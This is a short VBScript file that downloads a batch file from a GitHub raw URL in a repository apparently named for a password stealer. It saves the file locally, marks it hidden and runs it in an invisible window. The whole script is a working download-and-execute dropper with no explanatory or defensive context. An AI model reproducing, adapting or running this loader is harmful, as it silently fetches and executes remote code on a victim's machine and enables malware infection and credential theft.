Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

' URL of the file to download
url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/main.bat"

' Local path where the file will be saved
localFilePath = "main.bat"

' Create a WinHTTP object
objWinHTTP.Open "GET", url, False
objWinHTTP.Send

' Check if the request was successful (status code 200)
If objWinHTTP.Status = 200 Then
    ' Create a FileSystemObject to write the file
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(localFilePath, True)
    
    ' Write the downloaded content to the file
    objFile.Write objWinHTTP.ResponseText
    
    ' Close the file
    objFile.Close
    Set objFile = objFSO.GetFile(localFilePath)
    objFile.Attributes = objFile.Attributes + 2  ' Add the Hidden attribute
Else
    WScript.Echo "Failed to download the file. HTTP Status Code: " & objWinHTTP.Status
End If

Set objWinHTTP = Nothing
Set objFSO = Nothing
Set objFile = Nothing

Set objShell = CreateObject("WScript.Shell")
objShell.Run "main.bat", 0, False
Set objShell = Nothing
